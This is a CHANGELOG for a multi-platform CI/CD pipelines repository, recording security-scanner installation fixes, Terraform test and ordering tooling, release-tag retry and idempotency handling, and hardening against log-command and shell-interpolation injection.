- fixed the Azure DevOps `release` job (`azure-devops/global/stages/40-delivery/release.yaml`) failing on every merge to `main` whose commit body contains a literal `##vso[...]` or `##[...]` token. The `Extract Release Version` step ran `set -eux`, and xtrace echoed the user-controlled `$COMMIT_MESSAGE` (the merged PR description) to the log; the Azure DevOps agent then re-parsed the embedded token as a malformed logging command and aborted the job with `Required field 'variable' is missing in ##vso[task.setvariable] command`. The step now runs `set -eu`, so the message stays inside the grep/sed pipes and never reaches the log. The `Create Tag` step was hardened against the same class of leak: its request body (which embeds user-controlled `CHANGELOG.md` release notes) is now built with xtrace disabled and POSTed from a temp file via `curl --data-binary @`, so a token in the notes is never traced on the `DATA=...` assignment nor on the curl arguments

## [4.12.0] - 2026-06-03

### Added

- added `azuredevops` and `opsgenie` to the order-check default provider ranking (`DEFAULT_PROVIDER_ORDER`): `azuredevops` alongside `github`/`gitlab` and `opsgenie` right after `pagerduty`, so repos using these providers get them ranked heaviest-to-lightest without needing a per-repo `.terraform-order.json` override
- added `make test-order-check` and `.github/tests/test-order-check.sh` validating the order-check detection, safe auto-fix, idempotency, `.terraform-order.json` override, and JUnit output; included in the aggregate `make test`
- added a Terragrunt file-ordering check/auto-fixer (`global/scripts/languages/terraform/order-check/`) wired into the `10-code-check` stage of the `terra` and `terraform` pipelines on all three platforms (GitHub Actions, GitLab CI, Azure DevOps). It enforces the team's ordering standard for dense infrastructure repos: `dependency` blocks and the `inputs` block in `environments/**/root.hcl` ordered ascending by dependency number; the `// SET ON .HCL` / `// SET ON .ENV` grouping (with dependency-number ordering inside `.HCL`) in `stacks/*/variables.tf`; the heaviest-to-lightest provider order in every `providers.tf` (stacks and modules); and `stacks/*/outputs.tf` ordered to follow `main*.tf` module/resource declaration order. It runs in check mode as a CI gate (emitting `build/reports/junit-order-check.xml`) and offers `order-check/run.sh --fix` to auto-sort locally. The built-in provider ranking is overridable per-repo via an optional `.terraform-order.json` (`provider_order`, `ignore`). It is stdlib-only (`python3`); the `--fix` rewriter is round-trip-safe — it verifies the parsed file reproduces the original byte-for-byte and then only permutes existing block text, so it can never drop or corrupt content
- added chlog-based changelog validation support in the `basic-checks` templates across all three CI platforms (`azure-devops/global/stages/10-code-check/basic-checks.yaml`, `gitlab/global/stages/10-code-check/basic-checks.yaml`, `github/global/stages/10-code-check/basic-checks/action.yaml`): when a repo contains `.chlog.yaml`, the check now validates that at least one new fragment file was added in `.changes/unreleased/` instead of requiring direct `CHANGELOG.md` modifications; repos without `.chlog.yaml` keep the existing `CHANGELOG.md` validation unchanged (backward compatible)

### Changed

- changed the golang pipeline version from `1.26.3` to `1.26.4`

### Fixed

- fixed `global/scripts/tools/gitleaks/run.sh` intermittently failing with `gitleaks: not found` (exit 127): the install resolved the latest version through an unauthenticated `api.github.com` request, which is rate limited to 60 requests/hour per IP and returns HTTP 403 on shared GitHub-hosted runner IPs, leaving the version empty; because the script runs under POSIX `sh` (no `set -e`), the empty version then fell through a malformed download URL and a failed extraction to a cryptic missing-binary error at the first `gitleaks detect`. Version resolution now prefers the authenticated GitHub API when a token is available and otherwise uses the github.com `releases/latest` redirect (not API-rate-limited, no token required, identical on GitHub Actions, GitLab CI, and Azure DevOps), and the install fails fast with a clear message if the version cannot be resolved, the download fails, the archive cannot be extracted, or the binary cannot be made executable (cleaning up the leftover download in both failure cases) — and as a final guard if the `gitleaks` binary is still not runnable

## [4.11.0] - 2026-05-29

### Added

- added `CODEQL_RAM`, `CODEQL_THREADS` environment variable support and project-level `codeql-config.yml` auto-detection to `global/scripts/tools/codeql/run.sh`. Projects can now tune CodeQL resource usage via pipeline variables (`CODEQL_RAM` sets `--ram`, `CODEQL_THREADS` sets `--threads`, default `1`) and exclude irrelevant queries or paths by placing a `codeql-config.yml` in the project root (passed as `--codescanning-config`). Without any of these, behavior is identical to before
- added `DEPENDS_ON` parameter to Golang Azure DevOps stage templates (`10-code-check`, `20-security`, `30-tests`, `35-management`), allowing consumers to override stage dependencies for parallel execution

### Changed

- changed `global/scripts/tools/gitleaks/run.sh` to scope the scan to commits unique to the pull / merge request (`origin/<target>..HEAD`) when a PR context is detected via the platform's native environment variables (`GITHUB_BASE_REF` + `GITHUB_EVENT_NAME` on GitHub Actions, `CI_MERGE_REQUEST_TARGET_BRANCH_NAME` on GitLab CI, `SYSTEM_PULLREQUEST_TARGETBRANCH` on Azure DevOps). Previously, in PR builds the checked-out merge commit caused `gitleaks detect` to walk every commit reachable from `HEAD` — i.e., the entire base branch history plus the PR commits — which was wasted work (the base branch is already scanned by its own pipeline runs) and surfaced findings the team had already triaged on the base branch. Branch and tag builds keep the default full-history scope. When the target ref cannot be resolved locally even after a targeted `git fetch`, the script logs a warning and falls back to the full-history scan rather than silently scanning nothing
- changed the GitHub Actions Gitleaks composite (`github/global/stages/20-security/gitleaks/action.yaml`) to check out the full history (`fetch-depth: 0`). The default shallow clone (`fetch-depth: 1`) prevented `origin/<base>` from resolving on PR builds, which would have forced the new PR-scope logic in `run.sh` to fall back to a full-history scan. Azure DevOps already sets `fetchDepth: 0` and GitLab CI clones with full history by default, so only the GitHub composite needed adjustment
- changed the GitLab Go base image and the `golang.1.26-awscli` container from `1.26.2` to `1.26.3`, aligning them with the Azure DevOps GoTool version updated in `4.9.1`. The mismatch caused `sam build` in the delivery stage to fail with `go.mod requires go >= 1.26.3 (running go 1.26.2; GOTOOLCHAIN=local)`
- changed the terraform pipeline version from `1.15.4` to `1.15.5`
- refreshed `CLAUDE.md` and `.github/copilot-instructions.md` to add ShellCheck to the stage 20 SAST tools list, add the 8 `*-library.yaml` workflows to the copilot-instructions template list, and include `make test-docker-multi-arch` in the test suite usage section

### Fixed

- fixed `global/scripts/tools/codeql/run.sh` to abort with a clear error when `codeql database create` or `codeql database analyze` fail, or when the SARIF report is missing after analysis. Previously the script ignored the exit codes and continued into the `jq` / arithmetic pipeline, producing the same `Could not open file` and `[: Illegal number` cascade for any CodeQL failure (not just the ARM64 case above) and hiding the real error from operators
- fixed `global/scripts/tools/codeql/run.sh` to detect the host architecture before downloading the CodeQL bundle. The script previously downloaded `codeql-bundle-linux64.tar.gz` unconditionally, which fails on `aarch64` / `arm64` runners with `Exec format error` on the bundled JRE (`tools/linux64/java/bin/java`) and then cascaded into confusing downstream errors (`jq: Could not open file .../codeql.sarif`, `[: Illegal number`) that masked the real cause. Because GitHub does not publish a native Linux ARM64 CodeQL bundle ([`codeql-action#2839`](https://github.com/github/codeql-action/issues/2839)), the script now fails fast on `aarch64` / `arm64` with an actionable message telling the operator to switch to an `x86_64` runner or set up `qemu-user-static` `binfmt` emulation
- fixed `global/scripts/tools/gitleaks/run.sh` failing branch / tag / `main` builds for secrets that live on unrelated, unmerged feature branches. `gitleaks detect` without `--log-opts` invokes `git log -p -U0 --full-history --all --diff-filter=tuxdb` — the `--all` walks every ref in the local clone, not just commits reachable from HEAD. Since CI checkouts typically fetch every remote ref (Azure DevOps `fetchDepth: 0` + `fetchTags: true`, GitLab CI default full clone, the GitHub composite's `fetch-depth: 0`), a secret committed to `feat/leaky-thing` was failing the `main` pipeline, every release pipeline, and every other branch build instead of failing only on the branch that owns it. The non-PR path now defaults `LOG_OPTS="HEAD"` so the scan walks the build's actual branch / tag ancestry, ignoring whatever other refs happen to be present locally. PR scope (`origin/<target>..HEAD`) is unchanged; the PR fallback when the target ref is unreachable also drops from the implicit `--all` to `HEAD` rather than the previous "full-history" wording (which actually meant `--all`)
- fixed `global/scripts/tools/hadolint/run.sh` to detect the host architecture via `uname -m` when downloading the Hadolint binary. The script previously hard-coded `hadolint-Linux-x86_64`, which fails with `Exec format error` on `aarch64` / `arm64` runners. The new `case` switch maps `x86_64` and `aarch64`/`arm64` to the matching upstream binary (`hadolint-Linux-x86_64` / `hadolint-Linux-arm64`) and exits with a clear message on unsupported architectures, mirroring the `case`-based switch already used by `global/scripts/tools/gitleaks/run.sh` and `global/scripts/tools/shellcheck/run.sh`
- fixed `release.yaml` "Create Tag" step crashing with `RELEASE_VERSION: unbound variable` on non-bump merges whose commit message contains single quotes. The `SKIP_RELEASE` guard failed because Azure DevOps variable propagation appended a trailing quote to the value when the commit body contained apostrophes (e.g., `customer's`), making `[ "true'" = "true" ]` evaluate to false and falling through to the unbound variable. Removed `set -u` from the tag-creation script and added `:-` fallback on `RELEASE_VERSION` references as defense-in-depth. Added an early-exit guard for empty `RELEASE_VERSION` to prevent creating junk tags when the `SKIP_RELEASE` comparison fails

## [4.10.2] - 2026-05-22

### Changed

- changed `global/scripts/tools/gitleaks/run.sh` to download the Gitleaks static binary from its GitHub release instead of running the `zricethezav/gitleaks` Docker image. Docker Hub now enforces an anonymous pull rate limit, so every CI run with cold image layers risked a `toomanyrequests` failure in the `sast:gitleaks` job. Gitleaks ships a self-contained static Go binary per release, so the script resolves the latest release via the GitHub API, downloads the architecture-matched tarball (`x64`, `arm64`, `armv7`), and runs both detection passes (defaults + the GitLab-customized rule set) natively — removing the Docker-in-Docker entrypoint script and the `chmod -R 777` workaround. Mirrors the existing `shellcheck` and `hadolint` installation pattern
- changed `global/scripts/tools/semgrep/run.sh` to install Semgrep from PyPI into an isolated virtualenv instead of running the `returntocorp/semgrep` Docker image, for the same Docker Hub rate-limit reason. Semgrep has no standalone binary release, so the script creates a `python3 -m venv` and runs `pip install semgrep` inside it — a venv sidesteps the PEP 668 `externally-managed-environment` restriction on modern distributions without polluting the runner's system Python. Because the scan now runs directly on the host, the `~/.ssh` and `SSH_AUTH_SOCK` bind-mounts that previously forwarded `PRE_STEPS`-based SSH setup into the container are no longer needed, and the command is assembled with POSIX positional parameters instead of `eval`
- changed the GitLab CI `sast:semgrep` and `sast:gitleaks` jobs (`gitlab/global/stages/20-security/docker.yaml`) to stop extending `.scripts-repo-alpine-docker` (which provided the `docker:dind` service) now that neither tool runs in Docker. Both jobs run on the `python:3.13-slim` image — required for the Semgrep PyPI install and sufficient for the static Gitleaks binary — and install `git`, `jq`, and `curl` via `apt-get` in `before_script`. Azure DevOps and GitHub Actions need no wiring change because their runners already provide Python
- refreshed the `CLAUDE.md` *Script Conventions* section to replace the outdated "use Docker-in-Docker for tool isolation" rule with the native binary install pattern every tool `run.sh` actually follows (a GitHub release binary, an upstream installer, or a PyPI package), documenting the Docker Hub anonymous pull rate limit as the reason and listing the per-tool install method
- renamed the Semgrep and Gitleaks SAST stage files away from the misleading `docker` name now that neither tool runs in Docker. The Azure DevOps and GitLab `global/stages/20-security/docker.yaml` files were each split into per-tool `semgrep.yaml` and `gitleaks.yaml`, and the GitHub composite action directories `docker-semgrep` / `docker-gitleaks` were renamed to `semgrep` / `gitleaks` — matching the one-tool-per-file convention already used by the sibling `codeql`, `hadolint`, `shellcheck`, and `trivy` stage files. All internal references were updated across the three platforms (8 Azure DevOps stage files, 8 GitLab stage files, and 10 GitHub workflows)

### Fixed

- fixed `global/scripts/tools/semgrep/run.sh` never removing the temporary default `.semgrepignore` it copies in when the project has none. The cleanup guard `[ ! "$ignoreFileExists" ]` tested a non-empty string (`true` or `false`), which always evaluates as false, so the copied file was left behind in the consumer's working tree after every run. Corrected to `[ "$ignoreFileExists" = false ]`, matching the equivalent guard in `hadolint/run.sh`
- fixed the GitLab CI `sast:semgrep` and `sast:gitleaks` `artifacts:reports` paths in `gitlab/global/stages/20-security/docker.yaml`, which pointed at `build/reports/semgrep.json` and `build/reports/gitleaks.json`. The tool scripts source `cleanup.sh` with `TOOL_NAME` set, which nests every tool's output under a per-tool subdirectory, so the reports are actually written to `build/reports/semgrep/semgrep.json` and `build/reports/gitleaks/gitleaks.json` and GitLab silently ingested nothing. The `reports:sast` and `reports:secret_detection` paths now include the per-tool subdirectory, matching where the scripts write and the directory paths the Azure DevOps and GitHub Actions artifact steps already use

## [4.10.1] - 2026-05-21

### Changed

- changed the terraform pipeline version from `1.15.3` to `1.15.4`

## [4.10.0] - 2026-05-19

### Added

- added `DEPENDS_ON` parameter (`type: object`, default `''`) to JavaScript stage templates (`10-code-check`, `20-security`, `30-tests`, `35-management`) allowing consumers to override stage dependencies for parallel execution

### Changed

- changed the terraform pipeline version from `1.15.2` to `1.15.3`
- refreshed `CLAUDE.md` and `.github/copilot-instructions.md` to document the `make test-docker-multi-arch` target

### Fixed

- fixed `quality:proguard` GitHub Actions cache backend mismatch. The build tool detection in `action.yaml` checked `pom.xml` before `gradlew`, so repos containing both files received the Maven cache even though `run.sh` compiles them with Gradle. Flipped the detection order to mirror `run.sh` (`gradlew` first, then `pom.xml`) so the `actions/setup-java@v5` cache always matches the build tool that actually runs
- fixed golangci-lint version skew between local and CI by pinning the install script to `v2.12.2` and rejecting any locally installed binary that doesn't match the pinned version

## [4.9.1] - 2026-05-08

### Changed

- changed the golang pipeline version from `1.26.2` to `1.26.3`

### Fixed

- fixed `golangci-lint` install script URL pointing to the deprecated `master` branch instead of `main`. The golangci-lint project announced in v2.12.1 that `master` is no longer used, causing the stale install script to produce SHA256 checksum mismatches when downloading new releases and failing the pipeline with exit code 127. Switched to the official stable URL `https://golangci-lint.run/install.sh` recommended by the project
- fixed `quality:proguard` GitHub Actions step failing on Maven projects. The `actions/setup-java@v5` step was hardcoded with `cache: 'gradle'`, which errors out when no Gradle build files are present and prevented the proguard analysis from running on Maven repos. The setup now detects `pom.xml` vs `build.gradle*` / `gradlew` and selects the matching cache backend

## [4.9.0] - 2026-05-03

### Added

- added `platforms` input to `github/global/stages/40-delivery/docker/action.yaml` (default `linux/amd64,linux/arm64`) so the published manifest is a multi-arch list. The action now runs `docker/setup-qemu-action@v3` + `docker/setup-buildx-action@v3` before `docker/build-push-action@v7` so the build can cross-compile and emit a manifest list. Surfaced as `docker_platforms` on the `go-binary.yaml` reusable workflow for consumer override (defaults to the same multi-arch pair). Motivated by `code-guru` rolling out to an AKS cluster with `aks-workersarm-*` ARM workers and crashlooping with `exec /usr/local/bin/code-guru: exec format error` because the previous single-arch `linux/amd64` manifest could not execute on those nodes; every other Docker-publishing consumer (`go-docker.yaml`, `npm-docker.yaml`, `pdm-docker.yaml`, `bundler-docker.yaml`, `maven-docker.yaml`, `dotnet-docker.yaml`) inherits the new default automatically through the action and can override at the action call-site if a single platform is preferred

### Changed

- changed the `docker/build-push-action` invocation in `40-delivery/docker` to require buildx (`setup-buildx-action`) — the default Docker builder silently ignores `platforms:` and emits a single-arch manifest, which was the exact failure mode that crashlooped `code-guru` pods. With buildx the action correctly produces a manifest list

### Fixed

- fixed `tests > test:all` job in the GitHub Actions Go pipeline reinstalling `gotestsum`, `gocovmerge`, and `gocover-cobertura` on every run. `actions/setup-go@v6` caches `$GOMODCACHE` (module downloads) and `$GOCACHE` (build / test cache) by default, but it does NOT cache the effective Go binary install directory where `go install` drops compiled tool binaries — so even on a cache-warm run the script paid for three `@latest` proxy resolutions plus three rebuilds, which dominated the wall time of the test job. Added a `Resolve Go test tool binary directory` step in `github/golang/stages/30-tests/all/action.yaml` that derives the path from `go env GOBIN` (with fallback to `$(go env GOPATH)/bin`) and exports it as `GO_BIN_DIR` to `$GITHUB_ENV`, then an `actions/cache@v4` step that caches `${{ env.GO_BIN_DIR }}` keyed off `${runner.os}-${runner.arch}-go-${go-version}-test-tools-v1` (with `restore-keys` falling back to less specific prefixes) so the binaries persist across runs without colliding across architectures. Updated `global/scripts/languages/golang/test/run.sh` to short-circuit `go install` with `[ -x "$GOBIN_DIR/<tool>" ] ||` guards using the same `go env GOBIN` → `$(go env GOPATH)/bin` resolution (mirroring the same pattern already used by `govulncheck/run.sh`). The script change also benefits GitLab CI and Azure DevOps consumers that run their own caching outside of `setup-go` — bump the `v1` cache-key suffix to force a tool refresh

## [4.8.0] - 2026-04-29

### Added

- added `*-library.yaml` reusable workflows for every non-Go language (`composer-library.yaml`, `bundler-library.yaml`, `dotnet-library.yaml`, `pdm-library.yaml`, `yarn-library.yaml`, `npm-library.yaml`, `gradle-library.yaml`, `maven-library.yaml`). Each one mirrors `go-library.yaml`'s shape — calls the existing validation workflow (`<lang>.yaml`) and adds a `delivery-release` job that fires when a `chore/bump-X.Y.Z` merge lands on `main`. Exposes a `tag_prefixes` matrix input (default `'[""]'` to publish only plain tags; pass `'["", "v"]'` to publish both plain and `v`-prefixed tags). `go-library.yaml` keeps its historical `'["", "v"]'` default to avoid breaking existing consumers. Closes the gap where consumers of `composer.yaml` / `yarn.yaml` / `gradle.yaml` etc. were getting bumped without ever receiving a tag, because those validation-only workflows had no release stage and the `*-docker.yaml` variants forced a Docker build on projects that aren't Dockerized
- added `.github/tests/test-release-tag-idempotency.sh` — a regression test that exercises the HTTP-status → outcome mapping used by the `Create Tag` step in `azure-devops/global/stages/40-delivery/release.yaml`. Covers `200`/`201` (created), `409` (idempotent skip), and `400`/`401`/`403`/`404`/`422`/`500` (genuine failure). Wired into `make test` and the CI required-files check so any future edit that reintroduces `curl --fail` or breaks 409 idempotency is caught before merge — directly addresses the regression that red-lined `terraform-modules/azm-k8s-cluster` builds 34692/34725 and left several other modules in PartiallySucceeded
- added `.github/tests/test-tftest-gen.sh` — 24 BDD-style assertions (given / when / then) that exercise `gen_smoke_tests.py` against synthetic `terraform-modules` layouts: minimal module, required var with `validation {}`, `object(...)`-typed validated var (regression guard for the `_invalid_stub` type-error bug), `--force` override behavior against handwritten tests, optional (defaulted) var skipped from validation-coverage, `run.sh` shebang + POSIX compliance, and `makefiles/terraform.mk` early-exit guard (shims `terraform` and asserts init/test runs only when `tests/*.tftest.hcl` exists). Wired into `make test` so any future edit that re-introduces the bash-ism in `run.sh`, the `os.system` shell-interpolation, the `{}`-for-objects invalid stub, or the multi-shell `exit 0` guard bug is caught before merge
- added `azure-devops/terraform/stages/30-test/terra.yaml` — a new `test` stage slotted between `20-security` and `35-management` in the Azure DevOps `terraform` pipeline template used by `terraform-modules`, running three opt-in tiers against the single module at the repo root: Tier 0 (`test:smoke`, plan-time `terraform test` with `mock_provider` blocks; publishes `junit-terra-tests.xml`), Tier 1 (`test:e2e` apply-time HCL via `terraform test -test-directory=tests/e2e` with real providers; publishes `junit-e2e-tftest.xml`), and Tier 2 (`test:e2e` apply-time Go via the shared `terratest/run.sh` runner against `tests/terratest/`; publishes `junit-e2e-terratest.xml`); Tiers 1+2 share a single disposable [kind](https://kind.sigs.k8s.io/) cluster per build (scoped by `$(Build.BuildId)`, torn down on `condition: always()`, exporting both `KUBECONFIG` and `KUBE_CONFIG_PATH` since the Terraform `kubernetes` / `helm` providers do not fall back to the former), with Go installed lazily only when the Terratest tier is detected and Tier 0 running in parallel; the `kind` binary is downloaded to `Agent.TempDirectory/bin`, verified against its upstream `.sha256sum`, runtime arch-detected (`amd64` / `arm64`), and pinned to `kindest/node:v1.31.0`; modules without any of `tests/*.tftest.hcl` / `tests/e2e/` / `tests/terratest/` no-op silently, and all three tiers are blocking so a red apply-time regression cannot produce a tag
- added `deliver_docker` opt-in input to `go-binary.yaml` so consumers can release a Docker image alongside the binary in a single workflow call. Consumers opting in must grant `packages: write` permission at the workflow level (in addition to `contents: write` already required for `delivery-release`) so the `delivery-docker` job can authenticate against GHCR with `github.token`
- added `global/scripts/languages/terraform/tftest-gen/` — a generator that emits `tests/smoke.tftest.hcl` for a single terraform-module repo (per-repo-is-module layout, complementing the `modules/<name>/` layout handled by `customer-clusters/tests/generators/gen_smoke_tests.py`). Parses `variables.tf` + `main.tf` / `providers.tf`, emits one `mock_provider "<local>" {}` per required provider plus a `run "smoke_plans_successfully"` block with type-valid stubs for every required variable (name-hint table tuned for Azure / Cloudflare / Kubernetes / Helm / Keycloak / OpenSearch). For every required variable that has a `validation {}` block, also emits a `run "validation_rejects_invalid_<var>"` block with an invalid stub and `expect_failures = [var.<var>]` so guards are exercised instead of just declared. Respects handwritten tests (auto-generated files carry a marker on line 1). Piloted on `azm-resource-group` (no validations) and `azm-storage-account` (validations) — both green under `terraform test`
- added `gpg_sign` opt-in input to `go-binary.yaml` (default `false`) so consumers whose `.goreleaser.yaml` has a `signs:` block can import a GPG key and have `GPG_FINGERPRINT` populated for GoReleaser. The corresponding step in `github/golang/stages/40-delivery/binary/action.yaml` uses `crazy-max/ghaction-import-gpg@v6` and exposes `gpg_private_key` + `gpg_passphrase` as composite-action inputs (only consumed by the import step) so the secrets are not inherited as env vars by GoReleaser or other inner steps. The wrapper workflow only forwards the secrets when `gpg_sign` is `true`, and the action fails fast with a clear error message if `gpg_sign` is enabled but either secret is empty. The action emits the fingerprint as a step output rather than requiring consumers to keep a separate `GPG_FINGERPRINT` secret in sync. Closes the gap that took down `terraform-provider-http` releases `3.0.0` through `3.1.0` (every release since the migration to this pipeline produced an empty release page because GoReleaser failed at the `signs:` step with `template: failed to apply "{{ .Env.GPG_FINGERPRINT }}": map has no entry`)
- added `LCOV_RELATIVE_PATH` parameter propagation from `30-tests/yarn.yaml` stage template to the `test-all.yaml` step template, allowing callers to publish the LCOV coverage artifact for downstream SonarQube analysis
- added `PRE_STEPS` parameter to `azure-devops/terraform/terra.yaml`, the `20-security` stage (forwarded to the `sast:semgrep` and `sast:trivy` jobs), and the `30-test` stage it composes, mirroring the hook already accepted by the `terra/` template family used by customer-clusters / shared-toolbox / central-clusters. Steps passed via `PRE_STEPS` are spliced into both the SAST scanners that parse `*.tf` files and the `test:smoke` / `test:e2e` jobs before `terraform init` runs, so consumers whose modules pin private-git submodules (e.g. `k8s-deployment` references `git@dev.azure.com-northwind:v3/ContosoSecurity/terraform-modules/tf-container-image?ref=1.0.1`) can ship their SSH setup steps once and have both the security scans and tests resolve `terraform init` cleanly. Without this hook the init aborts with `ssh: Could not resolve hostname dev.azure.com-northwind`. Caught when `k8s-deployment` `!11632` failed CI for a different reason than the rest of the first batch and traced to a missing host alias on the agent
- added `test-gen` target to `makefiles/terraform.mk` that invokes the `tftest-gen` generator for the current module — `make test-gen` bootstraps a baseline `tests/smoke.tftest.hcl` in one step without operators having to remember the generator path. Idempotent
- promoted `.github/workflows/release.yaml` to dual-mode — keeps the existing `on: push` trigger so the pipelines repo continues to self-release, and additionally accepts `workflow_call` so any consumer (TeX, dotfiles, docs, configs, anything without a language pipeline) can wire just a tag-on-bump trigger by calling `rios0rios0/pipelines/.github/workflows/release.yaml@main`. Same `tag_prefixes` input as the new library workflows. The nested `update-major-tag` reference now resolves via the absolute `rios0rios0/pipelines/.github/workflows/update-major-version-tag.yaml@main` path so it works in both the self-trigger and `workflow_call` contexts

### Changed

- changed `test` target in `makefiles/terraform.mk` from `terraform plan` to `terraform test -junit-xml=$(REPORT_PATH)/junit-terra-tests.xml`. The old `plan` target only proved the module could compile with the caller's inputs; it did not exercise any `tests/*.tftest.hcl` assertions and produced no JUnit. The new target drives the native `terraform test` harness against the module's test suite and emits JUnit at the same `build/reports/junit-terra-tests.xml` path already consumed by the `terra-test/run.sh` aggregator, so `PublishTestResults@2` in Azure DevOps / `artifacts:reports:junit` in GitLab / `upload-artifact` in GitHub Actions see the results without further wiring. Also, gracefully no-ops with a clear message when `tests/*.tftest.hcl` is absent so modules onboard incrementally — `make test-gen` is the one-step bootstrap
- changed the `azure-devops/global/stages/40-delivery/release.yaml` stage gate to fire on every merged commit to `refs/heads/main` instead of only when `Build.SourceVersionMessage` contains the substrings `chore/bump-` or `chore(bump)`. The old substring guard was a false-positive trap — a commit like `refactor: clarified chore(bump) workflow` would pass and waste a job spin-up even though the bash regex inside the step would correctly set `SKIP_RELEASE=true` and no-op. It was also a false-negative trap waiting to happen if anyone renamed the bump convention. The bash regex inside the step is now the single source of truth: non-bump commits set `SKIP_RELEASE=true` and the tag-creation steps exit cleanly. Cost: one short job spin-up per merged commit on `main`; benefit: correctness + one less knob to keep in sync
- refreshed `CLAUDE.md` and `.github/copilot-instructions.md` to document the full `make test` suite (6 targets), all 7 language directories under `global/scripts/languages/`, the `shellcheck` tool, and the newer Terraform helpers (`cyclonedx`, `tftest-gen`, `structural`)

### Fixed

- fixed `.github/workflows/go-binary.yaml` `deliver_docker` input description that embedded `${{ github.repository }}`. The `github` context is not available when GitHub Actions parses `workflow_call.inputs` definitions, so every consumer of `go-binary.yaml@main` was rejected with `context "github" is not allowed here` and produced a workflow run with zero jobs. This took down PR validation for every Go consumer (`autobump`, `autoupdate`, `gitforge`, `terra`, `cliforge`, `langforge`, etc.) and prevented the autobump-automation merge runs from creating release tags after the bump PRs were merged. Replaced the expression with a literal `ghcr.io/<owner>/<repo>` placeholder
- fixed `azure-devops/global/stages/40-delivery/release.yaml` `Create Tag` step to actually retry on transient HTTP statuses by replacing the non-existent `--retry-on-http-error 429,500,502,503,504` curl flag with a bash retry loop on the captured `HTTP_STATUS`. curl's built-in `--retry` only triggers when curl exits non-zero, which requires `--fail`, but `--fail` would also abort the script on `409` (tag already exists, idempotent success) before the existing `case` could recognize it — so the retry has to live in bash. Same five-attempt / five-second-delay behaviour as the original intent, just driven from the right place. Symptom that motivated this: Contoso-App `kickstart` build 36253 emitted `curl: option --retry-on-http-error: is unknown` / `Bash exited with code '2'`, because no curl version recognises that flag. The retry loop also handles transport-level failures (DNS / TLS / timeout / connection reset) by wrapping curl with `set +e` / `set -e`, capturing its exit code, and synthesizing `HTTP_STATUS="000"` on non-zero exits so the same retry case-statement covers transient transport errors instead of `set -e` aborting the step before the loop sees them
- fixed `azure-devops/global/stages/40-delivery/release.yaml` to treat HTTP 409 from the `annotatedtags` endpoint as success instead of a pipeline failure. When AutoBump pushes the version tag as part of opening the `chore/bump-X.Y.Z` PR, the post-merge release stage on `main` would then `curl --fail -X POST .../annotatedtags` and abort with `curl: (22) ... error: 409` because the tag already existed — symptom seen in `terraform-modules/azm-k8s-cluster` builds 34692 (1.8.0) and 34725 (1.9.0), plus PartiallySucceeded runs on `azm-key-vault`, `helm-opensearch`, `k8s-namespace`, and `tf-container-image`. The step now captures the HTTP status via `-w "%{http_code}"`, emits a clear "tag already exists" log on 409, retries only on 429/5xx, and surfaces the response body on genuine 4xx failures (400/401/403/404) so operators can distinguish a real problem from the AutoBump race
- fixed `azure-devops/terraform/stages/30-test/terra.yaml` Tier 1 e2e job: the `terraform init` step now passes `-test-directory=tests/e2e` so that `module { source = "./tests/e2e/setup" }` blocks referenced from `.tftest.hcl` files have their submodules installed before `terraform test` runs. Without this flag, init only walks the root module and `terraform test` aborts with `Error: Module not installed`. Caught when the first three e2e PRs (k8s-secret-docker `!11628`, helm-postgresql `!11630`, k8s-deployment `!11632`) failed in their first CI runs after PR `#375` merged. Modules whose tests use a setup submodule (which is the standard pattern for any module that requires a namespace, secret, or other prerequisite Kubernetes object before its own apply) all hit this. k8s-execute `!11631` was unaffected because its e2e doesn't use a setup submodule
- fixed `global/scripts/languages/terraform/tftest-gen/gen_smoke_tests.py::parse_required_providers` to capture the `RE_SOURCE` match once per provider entry instead of running the regex twice per entry and falling back through a hard-to-read `or re.match("", "")` chain
- fixed `global/scripts/languages/terraform/tftest-gen/gen_smoke_tests.py` to canonicalize formatting via `subprocess.run(["terraform", "-chdir=<repo>", "fmt", "tests/"])` instead of `os.system(f"terraform -chdir={repo} fmt ...")`. The old call assembled a shell command by string interpolation, which broke on repo paths containing spaces and was a command-injection footgun for an adversarial `--repo-dir`. The new call uses argv (no shell), logs a warning if `terraform` is absent from `PATH` or exits non-zero, and still emits the generated file so a missing formatter is never a hard failure
- fixed `global/scripts/languages/terraform/tftest-gen/gen_smoke_tests.py` to skip `validation_rejects_invalid_<var>` runs for variables typed as `object(...)` or `tuple(...)`. Previously `_invalid_stub` returned `{}` / `[]` for those types, which fails Terraform's type check *before* any `validation {}` block runs — so `expect_failures = [var.<var>]` captured the wrong failure mode and the guard was never actually exercised. `_invalid_stub` now returns `None` for types where no type-valid-but-value-invalid stub is derivable from the type expression alone, and `render_smoke` filters those variables out of the validation-coverage suite. `bool` is also skipped (no inherently-invalid bool value)
- fixed `global/scripts/languages/terraform/tftest-gen/run.sh` to use `#!/usr/bin/env sh` with `set -eu` (matches the POSIX-`sh` convention documented for all `run.sh` scripts), replaced `BASH_SOURCE[0]` with `$0`, and replaced `[ ! -x "$(command -v python3)" ]` with `! command -v python3 >/dev/null 2>&1` — the old check failed whenever `command -v` returned a shell function / alias name (which is not an executable path) even though `python3` was callable
- fixed `global/scripts/tools/trivy/run.sh` and `run-sca.sh` failing intermittently with `aquasecurity/trivy crit unable to find ''` followed by `trivy: not found` and ADO `Bash exited with code '127'`. The upstream `install.sh` resolves the `latest` Trivy release via GitHub's releases API, which is rate-limited and occasionally returns an empty body; the helper aborts WITHOUT dropping the binary on disk, the next two `trivy ...` invocations exit `127`, and the failure surfaces 30 lines downstream of the actual install crash with no clear pointer back. Wrapped the install in a 3-attempt linear-backoff retry that verifies the binary lands at `/tmp/trivy` before continuing. Each attempt captures the installer/curl exit status and stderr to `/tmp/trivy-install.log` (curl now uses `-fsSL --show-error` so DNS/TLS failures surface instead of being silenced by `-s`); per-attempt failure logs and the last installer output are echoed to stderr so operators can see *why* the install never produced the binary. On permanent failure, exits `1` with a generalized remediation message that lists the GitHub API rate limit, transient network failures, raw.githubusercontent.com being blocked, and upstream GitHub downtime as common causes, then points at version pinning. Symptom that motivated this: `shared-toolbox` build `36643`'s `sast:trivy` job hit the empty-tag path while the sibling `sca:trivy` job ran a few seconds later and resolved `0.70.0` cleanly
